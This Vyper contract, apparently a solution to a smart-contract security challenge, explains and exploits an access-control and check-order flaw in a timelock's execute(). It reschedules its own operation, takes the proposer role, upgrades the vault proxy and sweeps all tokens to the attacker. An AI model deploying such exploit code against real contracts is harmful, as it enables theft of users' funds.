# @version ^0.3.7

"""
The vulnerability is in the `execute()` function of the 
ClimberTimelock Contract. Firstly, it does not have any access 
controls, allowing anyone to call the function. Secondly, it does not
follow the 'Check, Effects, Interactions' pattern. An operation is only
supposed to be executed, if it is ready to be executed. However, the function
does the function calls first before checking if the operation is actually 
allowed to be executed. Therefore an attacker is able to string together a
series of function calls from their attack contract and then schedule their
function calls as an operation, which will result in the check in `execute()`
to pass. The string of function calls is as follows: 1. Call the timelock 
contract to update the delay time to 0 so that an operation can be executed 
right after it is scheduled (timelock is calling itself so the check in 
`updateDelay()` will pass). 2. Call timelock contract to grant our contract
the proposer role so that we can schedule the operation ourselves (timlock is again
calling itself and has the admin role so it has the ability to grant us the proposer
role). 3. Call ourself to schedule the operation so that the final check in 
`execute()` can pass. 4. Call proxy/vault contract to upgrade and call into 
a new implementation. The new implementation is our contract and the function we 
will call is `sweep_funds()` (the timelock is the owner of the proxy/vault so 
it has the ability to upgrade the proxy implementation). Finally we will be sure 
to have a view function called `proxiableUUID()` which returns the implementation 
slot as specified in EIP1967. This function is called during the upgrade process
and if it does not return the proper implementation slot, it will revert.
"""

from vyper.interfaces import ERC20 as IERC20

interface ITimelock:
    def execute(
        targets: DynArray[address, max_value(uint8)],
        values: DynArray[uint256, max_value(uint8)],
        dataElements: DynArray[Bytes[max_value(uint16)], max_value(uint8)],
        salt: bytes32,
    ): payable
    def schedule(
        targets: DynArray[address, max_value(uint8)],
        values: DynArray[uint256, max_value(uint8)],
        dataElements: DynArray[Bytes[max_value(uint16)], max_value(uint8)],
        salt: bytes32,
    ): nonpayable 

owner: immutable(address)
token: immutable(IERC20)

_IMPLEMENTATION_SLOT: constant(bytes32) = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc

timelock: address
vault: address

@external
@payable
def __init__(_token: IERC20, _timelock: address, _vault: address):
    owner = msg.sender
    token = _token
    self.timelock = _timelock
    self.vault = _vault

@external
def attack():
    assert msg.sender == owner, "!owner"
    targets: DynArray[address, max_value(uint8)] = []
    values: DynArray[uint256, max_value(uint8)] = []
    data_elements: DynArray[Bytes[max_value(uint8)], max_value(uint8)] = []
    targets, values, data_elements = self._build_op()
    ITimelock(self.timelock).execute(targets, values, data_elements, empty(bytes32))

@internal
def _build_op() -> (DynArray[address, max_value(uint8)], DynArray[uint256, max_value(uint8)], DynArray[Bytes[max_value(uint8)], max_value(uint8)]):
    targets: DynArray[address, max_value(uint8)] = [self.timelock, self.timelock, self, self.vault]
    values: DynArray[uint256, max_value(uint8)] = [0, 0, 0, 0]
    data_elements: DynArray[Bytes[max_value(uint8)], max_value(uint8)] = []
    # prep calldata to update delay
    update_delay_data: Bytes[36] = _abi_encode(empty(uint256), method_id=method_id("updateDelay(uint64)"))
    data_elements.append(update_delay_data)
    # prep calldata to grant this contract proposer role
    grant_proposer_role_data: Bytes[68] = _abi_encode(keccak256("PROPOSER_ROLE"), self, method_id=method_id("grantRole(bytes32,address)"))
    data_elements.append(grant_proposer_role_data)
    # prep calldata to schedule the op
    schedule_op_data: Bytes[4] = method_id("schedule_op()")
    data_elements.append(schedule_op_data)
    # prep calldata to upgrade and call new impl
    upgrade_to_and_call_data: Bytes[132] = _abi_encode(self, method_id("sweep_funds()"), method_id=method_id("upgradeToAndCall(address,bytes)"))
    data_elements.append(upgrade_to_and_call_data)

    return targets, values, data_elements

@external
def schedule_op():
    targets: DynArray[address, max_value(uint8)] = []
    values: DynArray[uint256, max_value(uint8)] = []
    data_elements: DynArray[Bytes[max_value(uint8)], max_value(uint8)] = []
    targets, values, data_elements = self._build_op()
    ITimelock(self.timelock).schedule(targets, values, data_elements, empty(bytes32))
    
@external
def sweep_funds():
    token.transfer(owner, token.balanceOf(self))

@external
@view
def proxiableUUID() -> bytes32:
    return _IMPLEMENTATION_SLOT
